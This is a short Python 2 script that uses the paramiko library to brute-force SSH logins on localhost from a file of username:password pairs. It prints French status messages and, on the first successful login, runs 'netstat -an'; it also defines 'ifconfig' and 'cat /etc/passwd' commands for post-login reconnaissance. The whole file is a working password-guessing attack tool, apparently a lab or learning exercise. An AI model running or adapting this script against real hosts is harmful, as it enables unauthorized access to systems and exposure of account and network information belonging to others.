import paramiko
import sys

cmd1 = 'ifconfig'
cmd2 = 'cat /etc/passwd'
cmd3 = 'netstat -an'
list = open(sys.argv[1], "r")
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
for line in list.readlines() :
    username_password = line.strip().split(':')
    try :
        ssh.connect('localhost', username=username_password[0], password=username_password[1])
    except paramiko.AuthenticationException:

        
        print '[0] username et password incorrect '

    else :
        print '[1] mot de passe est correcte : user = %s et passwd = %s'%(username_password[0], username_password[1])
        stdin, stdout, stderr = ssh.exec_command(cmd3)
        for line in stdout.readlines():
            print line.strip()
        break

ssh.close()
